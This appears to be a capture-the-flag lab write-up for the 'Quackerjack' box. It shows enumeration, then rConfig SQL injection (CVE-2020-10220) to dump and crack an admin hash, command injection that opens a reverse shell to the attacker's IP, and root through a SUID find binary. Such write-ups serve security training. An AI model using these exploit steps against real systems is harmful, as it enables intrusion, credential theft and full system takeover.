##### Tags: `suid`  `find`  `rcinfig`  `CVE-2020-10220`

# 🐧Quackerjack🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.226.57 

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
3306/tcp open  mysql       MariaDB 10.3.23 or earlier (unauthorized)
8081/tcp open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
Service Info: Host: QUACKERJACK; OS: Unix
```
port 21 unable to login as anonymous  
port 80 nothing interesting  
port 111 unable to login to rpcclient  
port 139, 445 smb no share  
port 3306 mysql unable to login with root  
port 8081 is running rConfig Version 3.9.4 login page  
searchsploit found we can use SQLi to get the admin hash
```console
$ searchsploit rConfig                
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
rConfig 3.9 - 'searchColumn' SQL Injection                                      | php/webapps/48208.py
```
CVE-2020-10220
```console
$ python3 48208.py https://192.168.226.57:8081          
rconfig 3.9 - SQL Injection PoC
[+] Triggering the payloads on https://192.168.226.57:8081/commands.inc.php
[+] Extracting the current DB name :
rconfig
[+] Extracting 10 first users :
admin:1:dc40b85276a1f4d7cb35f154236aa1b2
```
crack the hash and we got the password abgrtyu  
since we have credential we can login with this python script
```console
$ searchsploit rConfig       
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
rConfig 3.9.4 - 'search.crud.php' Remote Command Injection                      | php/webapps/48241.py
```
```console
$ python3 48241.py https://192.168.226.57:8081 apple apple 192.168.45.167 22


$ penelope -p 22  
[+] Listening for reverse shells on 0.0.0.0:22 →  127.0.0.1 • 10.0.2.15 • 192.168.45.167
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from quackerjack 192.168.226.57 Linux-x86_64 👤 apache(48) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /home/ming/.penelope/sessions/quackerjack~192.168.226.57-Linux-x86_64/2026_03_21-16_35_20-896.log
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
bash-4.2$ id
uid=48(apache) gid=48(apache) groups=48(apache)
```
## Privilege Escalation
we have suid bit in find
```console
bash-4.2$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/find
```
https://gtfobins.org/gtfobins/find/#shell  
follow the command and we got the root shell
```console
bash-4.2$ find . -exec /bin/sh -p \; -quit 
sh-4.2# id
uid=48(apache) gid=48(apache) euid=0(root) groups=48(apache)
```

